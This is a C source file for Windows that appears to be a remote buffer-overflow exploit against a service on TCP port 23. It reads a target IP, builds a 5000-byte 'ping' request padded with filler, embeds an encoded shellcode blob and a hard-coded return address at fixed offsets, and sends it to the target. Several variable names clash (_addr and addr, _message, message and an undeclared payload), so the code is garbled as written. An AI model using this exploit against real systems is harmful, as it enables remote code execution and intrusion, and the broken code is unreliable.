#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winsock2.h>

#pragma comment(lib,"ws2_32.lib")
int main()
{
    WSADATA tmp;
    if (WSAStartup(MAKEWORD(1, 1), &tmp)) 
        exit(1);
    
    sockaddr_in _addr;
    {
        char ip[256];
        scanf("%s", ip);
        unsigned long my_addr = inet_addr(ip);
        addr.sin_family = AF_INET;
        memcpy(&addr.sin_addr, &my_addr, sizeof(my_addr));
    }
    _addr.sin_port = htons(23);
    memset(addr.sin_zero, 0, sizeof(addr.sin_zero));
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET)
        exit(1);  
    int e = connect(s, (const sockaddr*) & _addr, sizeof(_addr));

    char _message[5000];
	strcpy(message, "ping ");
    unsigned int ptr = 0x7e498c5f;
    char shellcode[] =
        "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30" \
        "\x42\x36\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42" \
        "\x30\x41\x44\x41\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54\x42\x50\x42\x50\x42\x30\x4b\x58\x45\x34" \
        "\x4e\x33\x4b\x38\x4e\x37\x45\x30\x4a\x57\x41\x30\x4f\x4e\x4b\x48\x4f\x44\x4a\x31\x4b\x38\x4f\x45\x42\x52\x41\x30\x4b\x4e" \
        "\x49\x54\x4b\x38\x46\x53\x4b\x48\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x59\x4e\x4a\x46\x38\x42\x4c\x46\x47\x47\x30\x41\x4c" \
        "\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e\x46\x4f\x4b\x53\x46\x45\x46\x32\x46\x50\x45\x37\x45\x4e\x4b\x48\x4f\x45\x46\x42" \
        "\x41\x30\x4b\x4e\x48\x46\x4b\x38\x4e\x50\x4b\x44\x4b\x58\x4f\x45\x4e\x41\x41\x50\x4b\x4e\x4b\x48\x4e\x51\x4b\x38\x41\x50" \
        "\x4b\x4e\x49\x48\x4e\x35\x46\x52\x46\x50\x43\x4c\x41\x33\x42\x4c\x46\x56\x4b\x38\x42\x34\x42\x53\x45\x38\x42\x4c\x4a\x37" \
        "\x4e\x50\x4b\x38\x42\x54\x4e\x50\x4b\x48\x42\x37\x4e\x31\x4d\x4a\x4b\x48\x4a\x46\x4a\x50\x4b\x4e\x49\x30\x4b\x38\x42\x48" \
        "\x42\x4b\x42\x30\x42\x30\x42\x30\x4b\x38\x4a\x36\x4e\x33\x4f\x55\x41\x53\x48\x4f\x42\x46\x48\x45\x49\x48\x4a\x4f\x43\x58" \
        "\x42\x4c\x4b\x37\x42\x55\x4a\x56\x42\x4f\x4c\x58\x46\x30\x4f\x35\x4a\x46\x4a\x49\x50\x4f\x4c\x38\x50\x50\x47\x55\x4f\x4f" \
        "\x47\x4e\x43\x56\x41\x46\x4e\x36\x43\x46\x42\x30\x5a";
    for (int i = 5; i < 5000; i++) {
        _message[i] = 't';
    }
	
    memcpy(payload + 4 + 5, &shellcode, sizeof(shellcode)-1);
    memcpy(payload + 1012 + 5, &ptr, sizeof(ptr));
    payload[4997] = '\r';
    payload[4998] = '\n';
    payload[4999] = '\0';
    send(s, payload, 5000, NULL);
	Sleep(5000);
    closesocket(s);
}
